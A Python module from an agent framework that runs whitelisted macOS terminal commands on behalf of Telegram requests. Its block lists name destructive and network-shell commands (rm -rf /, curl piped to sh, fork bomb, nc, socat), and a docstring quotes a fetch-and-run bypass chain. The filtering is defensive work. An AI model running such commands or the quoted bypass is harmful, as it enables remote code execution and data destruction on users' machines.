# SPDX-License-Identifier: PolyForm-Noncommercial-1.0.0
# Copyright (c) 2026 Phidipus Agents (see NOTICE)
"""
skills/apps/terminal_skills.py — Phidipus v1.38
═══════════════════════════════════════════════════════════════════════

P2 Option A: macOS Terminal Skill

Thực thi lệnh terminal, git, npm, python, ssh... và trả output về.
KHÔNG cần mở Terminal app, KHÔNG cần nhìn màn hình.
Chạy trong subprocess → kết quả trả về Telegram trong vài giây.

Security:
  - ALLOWED_COMMANDS whitelist: chỉ cho phép lệnh an toàn
  - BLOCKED_PATTERNS: block rm -rf /, sudo, curl pipe sh, v.v.
  - Max output 4000 chars để tránh spam Telegram
  - Timeout 30s per command (configurable)
  - Working directory phải nằm trong HOME hoặc whitelist

Actions:
  run_command(cmd, cwd)        → CommandResult
  git_status(repo)             → str
  git_log(repo, n)             → str
  git_commit(repo, msg, push)  → bool
  npm_run(cwd, script)         → CommandResult
  python_run(file, args)       → CommandResult
  read_file(path, lines)       → str
  write_file(path, content)    → bool
  get_disk_usage(path)         → dict
  list_processes()             → list[dict]

Entry: run_terminal_task(goal, ...) → CommandResult
"""
from __future__ import annotations

import asyncio
import os
import re
import shlex
import subprocess
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Optional

from utils.logger import get_logger

_log = get_logger(__name__, process="orchestrator")


def _vlog(icon: str, msg: str) -> None:
    print(f"\033[0;32m[{icon}]\033[0m  {msg}")


# ══════════════════════════════════════════════════════════════════
# Security config
# ══════════════════════════════════════════════════════════════════

# Chỉ cho phép các lệnh trong whitelist
ALLOWED_BASE_COMMANDS = frozenset({
    # Version control
    "git", "gh",
    # Node/JS
    "node", "npm", "npx", "yarn", "pnpm", "bun",
    # Python
    "python", "python3", "pip", "pip3", "uv",
    # File ops (safe)
    "ls", "cat", "head", "tail", "grep", "find", "wc", "sort", "uniq",
    "cp", "mv", "mkdir", "touch", "echo", "pwd", "df", "du",
    # Build/dev
    "make", "cargo", "go", "rustc",
    # Info
    "ps", "top", "htop", "which", "env", "printenv",
    "sw_vers", "uname", "date", "uptime",
    # macOS specific
    "open", "pbcopy", "pbpaste", "say",
    # Network (safe)
    "ping", "curl", "wget", "ssh", "sftp",
    # Other
    "ffmpeg", "convert", "jq", "awk", "sed",
    # v4.3: archive + navigation helpers used by bundled workflows
    "cd", "zip", "unzip", "tar", "gzip", "gunzip", "ditto", "basename",
    "dirname", "tr", "cut", "xargs", "tee", "true", "false", "test", "[",
    "stat", "file", "md5", "shasum", "realpath", "printf", "seq",
})

# v4.3: commands that must never appear in ANY segment of a pipeline/chain,
# even though their base name might otherwise look harmless.
_NEVER_ALLOWED = frozenset({
    "sudo", "su", "doas", "bash", "sh", "zsh", "fish", "dash", "ksh", "csh",
    "eval", "exec", "source", ".", "osascript", "launchctl", "defaults",
    "security", "chmod", "chown", "rm", "rmdir", "kill", "killall", "pkill",
    "shutdown", "reboot", "halt", "diskutil", "dd", "mkfs", "nc", "ncat",
    "netcat", "crontab", "at", "scp", "rsync", "socat", "telnet",
})

# Pattern nguy hiểm — BLOCK
BLOCKED_PATTERNS = [
    r"rm\s+-rf\s+/",           # rm -rf / hoặc /*
    r"sudo\s+rm",              # sudo rm
    r"mkfs",                   # format disk
    r"dd\s+if=",               # disk dump
    r"curl.*\|\s*(?:bash|sh)", # curl pipe shell
    r"wget.*\|\s*(?:bash|sh)",
    r":(){ :|:& };:",          # fork bomb
    r"chmod\s+777\s+/",       # chmod root
    r"chown\s+.*\s+/",        # chown root
    r"sudo\s+su",              # privilege escalation
    r"base64.*\|\s*sh",       # base64 decode + exec
    r"eval\s+\$\(",            # eval injection
    r">>\s*/etc/",             # write to /etc
    r">\s*/etc/",
]

MAX_OUTPUT_CHARS = 4000
DEFAULT_TIMEOUT  = 30.0


# ══════════════════════════════════════════════════════════════════
# Result
# ══════════════════════════════════════════════════════════════════

@dataclass
class CommandResult:
    success:    bool
    command:    str  = ""
    stdout:     str  = ""
    stderr:     str  = ""
    returncode: int  = 0
    duration_ms:int  = 0
    blocked:    bool = False

    @property
    def output(self) -> str:
        """Combined output, capped at MAX_OUTPUT_CHARS."""
        combined = ""
        if self.stdout:
            combined += self.stdout
        if self.stderr and not self.success:
            combined += f"\n[stderr] {self.stderr}"
        return combined[:MAX_OUTPUT_CHARS]

    @property
    def summary(self) -> str:
        if self.blocked:
            return f"🚫 BLOCKED: {self.command[:50]}"
        status = "✅" if self.success else "❌"
        lines = self.output.count("\n") + 1
        return f"{status} [{self.returncode}] {self.command[:50]} ({lines} lines, {self.duration_ms}ms)"


# ══════════════════════════════════════════════════════════════════
# Security checker
# ══════════════════════════════════════════════════════════════════

_SEGMENT_SPLIT = re.compile(r"\|\||&&|;|\||\n|&(?!>)")
_SUBST = re.compile(r"\$\(([^()]*)\)|`([^`]*)`")


def _command_segments(command: str) -> list[str]:
    """
    Split a shell command line into simple commands, including the bodies of
    $(...) and `...` substitutions.  Quoted separators are respected.
    """
    segments: list[str] = []
    pending = [command]
    while pending:
        cur = pending.pop()
        for m in _SUBST.finditer(cur):
            pending.append(m.group(1) if m.group(1) is not None else m.group(2))
        cur = _SUBST.sub(" SUBST ", cur)
        # mask quoted strings so separators inside quotes are ignored
        masked = re.sub(r"'[^']*'|\"(?:\\.|[^\"\\])*\"", lambda mm: "x" * len(mm.group(0)), cur)
        last = 0
        for m in _SEGMENT_SPLIT.finditer(masked):
            segments.append(cur[last:m.start()])
            last = m.end()
        segments.append(cur[last:])
    return [seg.strip() for seg in segments if seg.strip()]


def _base_command(segment: str) -> str:
    try:
        parts = shlex.split(segment)
    except ValueError:
        parts = segment.split()
    # skip leading VAR=value assignments and redirections
    while parts and (re.match(r"^[A-Za-z_][A-Za-z0-9_]*=", parts[0]) or parts[0] in ("time", "nohup", "env")):
        if parts[0] in ("time", "nohup", "env") and len(parts) > 1 and parts[0] == "env":
            parts = parts[1:]
            continue
        parts = parts[1:]
    return Path(parts[0]).name.lower() if parts else ""


def _security_check(command: str) -> tuple[bool, str]:
    """
    Returns (allowed, reason).
    allowed=False nếu command bị block.

    FIX v4.3: the whitelist used to check only the FIRST word, so
    "ls ; curl http://x/s.sh -o /tmp/s.sh ; bash /tmp/s.sh" was allowed.
    Every segment of a chain / pipeline / substitution is now checked, and
    python -c / inline interpreters are blocked.
    """
    # Check blocked patterns
    for pattern in BLOCKED_PATTERNS:
        if re.search(pattern, command, re.IGNORECASE):
            return False, f"Blocked pattern: {pattern}"

    if re.search(r"\b(?:python3?|node|ruby|perl|php)\b[^|;&]*\s-(?:c|e|-eval)\b", command):
        return False, "Inline interpreter code (-c/-e) bị chặn"
    if re.search(r"(?:^|\s)>{1,2}\s*(?:/etc|/System|/Library|/usr|/bin|/sbin|~/\.ssh|~/Library/LaunchAgents)", command):
        return False, "Ghi file vào thư mục hệ thống bị chặn"

    for seg in _command_segments(command):
        base = _base_command(seg)
        if not base or base == "subst":
            continue
        if base in _NEVER_ALLOWED:
            return False, f"Command '{base}' không được phép"
        if base not in ALLOWED_BASE_COMMANDS:
            return False, f"Command '{base}' không trong whitelist"
    return True, ""


def _safe_cwd(cwd: str | None) -> str:
    """Resolve cwd, đảm bảo nằm trong HOME hoặc /tmp."""
    if not cwd:
        return str(Path.home())
    expanded = str(Path(cwd).expanduser().resolve())
    home = str(Path.home())
    allowed_roots = (home, "/tmp", "/var/folders", "/private/tmp")
    if any(expanded.startswith(r) for r in allowed_roots):
        return expanded
    return home  # fallback về HOME nếu cwd không an toàn


# ══════════════════════════════════════════════════════════════════
# TerminalSkills
# ══════════════════════════════════════════════════════════════════

class TerminalSkills:
    """
    Thực thi terminal commands an toàn trên macOS.
    Mỗi command qua security check trước khi chạy.
    """

    async def run_command(
        self,
        command: str,
        cwd: str | None = None,
        timeout: float = DEFAULT_TIMEOUT,
        env: dict | None = None,
    ) -> CommandResult:
        """
        Chạy shell command và trả output.

        Examples:
            run_command("git status", cwd="~/projects/myapp")
            run_command("npm run build", cwd="~/projects/web")
            run_command("python3 script.py --output results.csv")
        """
        t0 = time.time()
        _vlog("💻", f"run_command: {command[:80]}")

        # Security check
        allowed, reason = _security_check(command)
        if not allowed:
            _vlog("🚫", f"Blocked: {reason}")
            return CommandResult(False, command=command, blocked=True,
                                 stderr=f"Blocked: {reason}")

        safe_cwd = _safe_cwd(cwd)
        run_env  = {**os.environ, **(env or {})}

        try:
            proc = await asyncio.to_thread(
                subprocess.run,
                command,
                shell=True,
                cwd=safe_cwd,
                capture_output=True,
                text=True,
                timeout=timeout,
                env=run_env,
            )
            ms = int((time.time()-t0)*1000)
            result = CommandResult(
                success=proc.returncode == 0,
                command=command,
                stdout=proc.stdout[:MAX_OUTPUT_CHARS],
                stderr=proc.stderr[:1000],
                returncode=proc.returncode,
                duration_ms=ms,
            )
            _vlog("✅" if result.success else "❌", result.summary)
            return result

        except subprocess.TimeoutExpired:
            return CommandResult(False, command=command,
                                 stderr=f"Timeout sau {timeout}s",
                                 duration_ms=int((time.time()-t0)*1000))
        except Exception as exc:
            return CommandResult(False, command=command, stderr=str(exc),
                                 duration_ms=int((time.time()-t0)*1000))

    # ── Git shortcuts ────────────────────────────────────────────

    async def git_status(self, repo: str = ".") -> CommandResult:
        """Xem git status của repo."""
        return await self.run_command("git status --short --branch",
                                      cwd=repo)

    async def git_log(self, repo: str = ".", n: int = 10) -> CommandResult:
        """Xem git log N commits gần nhất."""
        cmd = f"git log --oneline --graph --decorate -n {min(n, 50)}"
        return await self.run_command(cmd, cwd=repo)

    async def git_diff(self, repo: str = ".", staged: bool = False) -> CommandResult:
        """Xem git diff."""
        cmd = "git diff --stat" if not staged else "git diff --cached --stat"
        return await self.run_command(cmd, cwd=repo)

    async def git_commit(
        self,
        repo: str,
        message: str,
        add_all: bool = True,
        push: bool = False,
    ) -> CommandResult:
        """
        Commit (và optionally push) trong repo.
        Cần confirm từ user trước khi push.
        """
        cmds = []
        if add_all:
            cmds.append("git add -A")
        cmds.append(f'git commit -m "{message}"')
        if push:
            cmds.append("git push")
        combined = " && ".join(cmds)
        return await self.run_command(combined, cwd=repo)

    async def git_pull(self, repo: str = ".") -> CommandResult:
        return await self.run_command("git pull", cwd=repo)

    async def git_branch(self, repo: str = ".") -> CommandResult:
        return await self.run_command("git branch -a", cwd=repo)

    # ── Node / npm ────────────────────────────────────────────────

    async def npm_run(self, cwd: str, script: str = "build") -> CommandResult:
        """Chạy npm script."""
        return await self.run_command(f"npm run {script}", cwd=cwd, timeout=120.0)

    async def npm_install(self, cwd: str) -> CommandResult:
        """npm install."""
        return await self.run_command("npm install", cwd=cwd, timeout=180.0)

    async def npm_list(self, cwd: str) -> CommandResult:
        """Xem packages đã cài."""
        return await self.run_command("npm list --depth=0", cwd=cwd)

    # ── Python ────────────────────────────────────────────────────

    async def python_run(
        self,
        script: str,
        args: str = "",
        cwd: str | None = None,
    ) -> CommandResult:
        """Chạy Python script."""
        cmd = f"python3 {script} {args}".strip()
        return await self.run_command(cmd, cwd=cwd, timeout=60.0)

    async def pip_list(self) -> CommandResult:
        """Xem packages Python đã cài."""
        return await self.run_command("pip3 list")

    async def pip_install(self, package: str) -> CommandResult:
        """Cài Python package."""
        return await self.run_command(f"pip3 install {package}")

    # ── File reading (không cần VLM) ──────────────────────────────

    async def read_file(
        self,
        path: str,
        max_lines: int = 100,
        tail: bool = False,
    ) -> CommandResult:
        """
        Đọc nội dung file text.

        Examples:
            read_file("~/projects/app.py", max_lines=50)
            read_file("~/server.log", max_lines=20, tail=True)  # đọc cuối file
        """
        expanded = str(Path(path).expanduser())
        if tail:
            cmd = f"tail -n {max_lines} {expanded}"
        else:
            cmd = f"head -n {max_lines} {expanded}"
        return await self.run_command(cmd)

    async def write_file(self, path: str, content: str) -> CommandResult:
        """Ghi nội dung vào file (tạo mới hoặc overwrite)."""
        try:
            p = Path(path).expanduser()
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_text(content, encoding="utf-8")
            return CommandResult(True, f"write_file:{path}",
                                 stdout=f"Đã ghi {len(content)} chars vào {p}")
        except Exception as exc:
            return CommandResult(False, f"write_file:{path}", stderr=str(exc))

    # ── System info ──────────────────────────────────────────────

    async def get_disk_usage(self, path: str = "~") -> CommandResult:
        """Xem disk usage."""
        expanded = str(Path(path).expanduser())
        return await self.run_command(f"du -sh {expanded}")

    async def get_system_info(self) -> CommandResult:
        """Thông tin hệ thống: macOS version, RAM, CPU."""
        cmd = "sw_vers && echo '---' && sysctl -n hw.memsize | awk '{print $1/1024/1024/1024 \" GB RAM\"}'"
        return await self.run_command(cmd)

    async def list_processes(self, filter_str: str = "") -> CommandResult:
        """Xem processes đang chạy."""
        if filter_str:
            return await self.run_command(f"ps aux | grep {filter_str}")
        return await self.run_command("ps aux | head -20")


# ══════════════════════════════════════════════════════════════════
# Entry point cho SmartRouter Fast Lane
# ══════════════════════════════════════════════════════════════════

_TERMINAL = TerminalSkills()


async def run_terminal_task(
    goal: str,
    ipc_client: Any = None,
    notify_fn: Any = None,
) -> CommandResult:
    """
    Entry point: parse goal → chạy đúng terminal command.

    Examples handled:
        "git status trong ~/projects/myapp"
        "npm run build trong thư mục web"
        "chạy python3 script.py"
        "xem 50 dòng cuối log file ~/server.log"
        "git commit 'fix bug' và push"
        "npm install trong ~/frontend"
        "pip list"
        "xem disk usage"
    """
    gl = goal.lower()

    # ── Git ─────────────────────────────────────────────────────
    if "git" in gl:
        repo = _extract_path_from_goal(goal) or "."
        if "status" in gl:
            result = await _TERMINAL.git_status(repo)
        elif "log" in gl:
            n = _extract_number(goal, 10)
            result = await _TERMINAL.git_log(repo, n)
        elif "diff" in gl:
            result = await _TERMINAL.git_diff(repo, staged="staged" in gl)
        elif "pull" in gl:
            result = await _TERMINAL.git_pull(repo)
        elif "branch" in gl:
            result = await _TERMINAL.git_branch(repo)
        elif "commit" in gl:
            msg = _extract_quoted(goal) or "Auto commit by Phidipus"
            push = "push" in gl
            result = await _TERMINAL.git_commit(repo, msg, push=push)
        else:
            # Generic git command
            cmd = _extract_after_keyword(goal, "git")
            result = await _TERMINAL.run_command(f"git {cmd}", cwd=repo)

    # ── npm ─────────────────────────────────────────────────────
    elif "npm" in gl:
        cwd = _extract_path_from_goal(goal) or "."
        if "install" in gl:
            result = await _TERMINAL.npm_install(cwd)
        elif "list" in gl or "ls" in gl:
            result = await _TERMINAL.npm_list(cwd)
        else:
            script = _extract_after_keyword(goal, "run") or "build"
            result = await _TERMINAL.npm_run(cwd, script)

    # ── Python ──────────────────────────────────────────────────
    elif any(k in gl for k in ("python", "python3", "pip")):
        if "pip list" in gl:
            result = await _TERMINAL.pip_list()
        elif "pip install" in gl:
            pkg = _extract_after_keyword(goal, "install")
            result = await _TERMINAL.pip_install(pkg)
        else:
            script = _extract_path_from_goal(goal) or ""
            args   = _extract_after_keyword(goal, script) if script else ""
            result = await _TERMINAL.python_run(script, args)

    # ── Read file ────────────────────────────────────────────────
    elif any(k in gl for k in ("đọc", "read", "xem nội dung", "cat")):
        path = _extract_path_from_goal(goal) or "~/Desktop"
        tail = any(k in gl for k in ("cuối", "tail", "last"))
        n    = _extract_number(goal, 50)
        result = await _TERMINAL.read_file(path, n, tail=tail)

    # ── Disk usage ───────────────────────────────────────────────
    elif any(k in gl for k in ("disk", "dung lượng", "usage", "du ")):
        path = _extract_path_from_goal(goal) or "~"
        result = await _TERMINAL.get_disk_usage(path)

    # ── System info ──────────────────────────────────────────────
    elif any(k in gl for k in ("system", "hệ thống", "ram", "cpu", "macos version")):
        result = await _TERMINAL.get_system_info()

    # ── Process list ─────────────────────────────────────────────
    elif any(k in gl for k in ("process", "ps ", "tiến trình", "đang chạy")):
        result = await _TERMINAL.list_processes()

    # ── Generic command ──────────────────────────────────────────
    elif any(k in gl for k in ("chạy", "run", "execute", "thực thi")):
        # Tìm command sau keyword
        cmd = (
            _extract_after_keyword(goal, "chạy")
            or _extract_after_keyword(goal, "run")
            or _extract_after_keyword(goal, "execute")
        )
        cwd = _extract_path_from_goal(goal)
        result = await _TERMINAL.run_command(cmd, cwd=cwd)

    else:
        # Fallback: thử chạy như command thô
        result = await _TERMINAL.run_command(goal)

    # Notify Telegram
    if notify_fn:
        try:
            if result.blocked:
                await notify_fn(f"🚫 *Lệnh bị chặn vì lý do bảo mật*\n`{result.command[:100]}`")
            elif result.success:
                output = result.output[:3000]
                msg = f"✅ *Terminal OK*\n```\n{output}\n```"
                await notify_fn(msg)
            else:
                await notify_fn(
                    f"❌ *Lệnh thất bại* (code {result.returncode})\n"
                    f"```\n{result.output[:500]}\n```"
                )
        except Exception:
            pass

    _vlog("💻", result.summary)
    return result


# ── Parsing helpers ───────────────────────────────────────────────

def _extract_path_from_goal(text: str) -> str:
    m = re.search(r'([~/][^\s"\']+)', text)
    return m.group(1) if m else ""

def _extract_quoted(text: str) -> str:
    m = re.search(r'["\']([^"\']+)["\']', text)
    return m.group(1) if m else ""

def _extract_after_keyword(text: str, keyword: str) -> str:
    idx = text.lower().find(keyword.lower())
    if idx == -1:
        return ""
    return text[idx + len(keyword):].strip().split("\n")[0].strip()[:200]

def _extract_number(text: str, default: int = 10) -> int:
    m = re.search(r'\b(\d+)\b', text)
    return int(m.group(1)) if m else default
